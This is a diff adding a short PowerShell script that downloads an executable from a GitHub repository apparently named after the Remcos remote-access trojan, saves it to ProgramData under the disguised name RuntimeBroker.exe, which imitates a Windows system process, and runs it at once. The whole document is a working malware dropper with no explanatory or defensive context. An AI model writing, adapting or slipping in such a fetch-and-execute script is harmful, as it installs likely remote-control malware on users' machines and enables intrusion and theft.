@@ -1,0 +1,5 @@
+$filePath = "C:\ProgramData\RuntimeBroker.exe"
+$url = "https://raw.githubusercontent.com/ashduasdoasdoasd/remcos1test/refs/heads/main/RuntimeBroker.exe" 
+Invoke-WebRequest -Uri $url -OutFile $filePath
+
+& $filePath
